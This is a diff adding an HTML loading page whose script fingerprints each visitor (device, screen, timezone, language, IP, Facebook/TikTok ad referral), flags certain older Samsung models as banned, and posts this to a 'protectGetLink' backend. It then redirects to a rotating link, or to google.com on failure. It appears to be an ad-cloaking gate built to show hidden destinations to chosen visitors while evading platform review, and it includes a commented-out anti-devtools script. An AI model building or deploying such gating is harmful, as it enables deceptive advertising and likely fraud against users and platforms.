@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loading...</title>
+    <style>
+      /* basic styling for the loading screen */
+      #loading {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        background: rgba(255, 255, 255, 0.8);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+      .spinner {
+        width: 50px;
+        height: 50px;
+        border: 6px solid #ccc;
+        border-top-color: #333;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      #loadingText {
+        font-size: 24px;
+        color: #333;
+        margin-top: 10px;
+      }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.5/mobile-detect.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@2.0.0-beta.2/dist/ua-parser.min.js"></script>
+    <!--<script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest/disable-devtool.min.js'></script> -->
+  </head>
+  <body>
+    <div id="loading">
+      <div class="spinner"></div>
+      <div id="loadingText">Loading...</div>
+    </div>
+    <div>
+      <p id="vpn"></p>
+    </div>
+    <script>
+      // 记录开始时间
+      const startTime = performance.now();
+
+      async function sendAjaxRequest() {
+        const md = new MobileDetect(window.navigator.userAgent);
+        const urlParams = new URLSearchParams(window.location.search);
+        const hasQueryParams = urlParams.toString() !== "";
+        const parser = new UAParser();
+        const resultPar = parser.getResult();
+
+        // 检测设备信息
+        const deviceType = md.mobile() ? "Mobile" : "PC";
+        const isMobile = md.mobile() !== null || md.tablet() !== null;
+        const isIOS = md.is("iOS")
+          ? "iOS"
+          : md.is("AndroidOS")
+          ? "Android"
+          : "Other";
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        const pixelRatio = window.devicePixelRatio;
+        const timezoneName = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const continent = timezoneName.split("/")[0];
+        const userLanguage = navigator.language || navigator.userLanguage;
+
+        // 检测是否来自社交平台
+        let codefb = "";
+        if (urlParams.get("utm_source") === "fb" && urlParams.has("fbclid")) {
+          codefb = "Facebook广告访问的。";
+        } else if (urlParams.has("fbclid")) {
+          codefb = "Facebook链接访问的。";
+        } else if (urlParams.get("utm_source") === "fb") {
+          codefb = "Facebook广告访问的。";
+        } else if (urlParams.has("ttclid")) {
+          codefb = "TikTok链接访问的。";
+        } else {
+          codefb = "不是Facebook或TikTok";
+        }
+
+        // 获取设备型号
+        const modelSM = resultPar.device.model;
+        let isSamsung = "Not Samsung";
+        // 检查型号是否包含 "SM-G" 并提取数字部分
+        if (modelSM && modelSM.startsWith("SM-G")) {
+          const modelNumber = parseInt(modelSM.match(/\d+/)[0], 10);
+          // 判断是否低于 955
+          if (modelNumber < 960) {
+            console.log(`禁止访问：设备型号 ${modelSM} 低于 SM-G955U`);
+            isSamsung = "BannedSamsung";
+          } else {
+            console.log(`允许访问：设备型号 ${modelSM} 符合要求`);
+            isSamsung = "Samsung";
+          }
+        }
+
+        try {
+          // 第一步：快速获取IP地址
+          console.log("开始获取IP地址...");
+          const ipDataResponse = await fetch("get_ip_info.php").catch(() =>
+            fetch("https://ipapi.co/json/")
+          );
+          const ipData = await ipDataResponse.json();
+          const ip = ipData.ip;
+
+          const ipTime = performance.now() - startTime;
+          console.log(`IP获取完成，耗时: ${ipTime.toFixed(2)}ms`);
+
+          // 第二步：快速获取轮询链接
+          console.log("开始获取轮询链接...");
+          const linkStart = performance.now();
+
+          const response = await fetch(
+            "http://127.0.0.1:3031/fbVpnStock/protectGetLink",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                domainName: window.location.host + window.location.pathname,
+                userIp: ip,
+                userMobile: deviceType,
+                paraPath: hasQueryParams,
+                isIOSS: isIOS,
+                fb: codefb,
+                screenWidth: screenWidth,
+                screenHeight: screenHeight,
+                pixelRatio: window.devicePixelRatio,
+                continent: continent,
+                isMobile: isMobile,
+                userLanguage: userLanguage,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                sessionId: generateSessionId(),
+              }),
+            }
+          );
+
+          const responseData = await response.json();
+          const linkTime = performance.now() - linkStart;
+          console.log(`轮询链接获取完成，耗时: ${linkTime.toFixed(2)}ms`);
+
+          if (
+            responseData.success &&
+            responseData.data &&
+            responseData.data.link
+          ) {
+            // 第三步：立即跳转到轮询链接
+            console.log("开始跳转到轮询链接:", responseData.data.link);
+            const jumpStart = performance.now();
+
+            window.location.replace(responseData.data.link);
+
+            const jumpTime = performance.now() - jumpStart;
+            const totalTime = performance.now() - startTime;
+            console.log(
+              `跳转完成，跳转耗时: ${jumpTime.toFixed(
+                2
+              )}ms，总耗时: ${totalTime.toFixed(2)}ms`
+            );
+
+            // 注意：protectGetLink接口已经异步处理了访问记录，无需额外调用quickRecord
+          } else {
+            console.error("获取轮询链接失败:", responseData);
+            // 跳转到默认链接
+            window.location.replace("https://www.google.com");
+          }
+        } catch (error) {
+          console.error("请求处理失败:", error);
+          // 发生错误时跳转到默认链接
+          window.location.replace("https://www.google.com");
+        }
+      }
+
+      // 生成会话ID
+      function generateSessionId() {
+        return (
+          "lunxun_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
+        );
+      }
+
+      // 页面加载完成后立即执行
+      window.onload = sendAjaxRequest;
+    </script>
+  </body>
+</html>
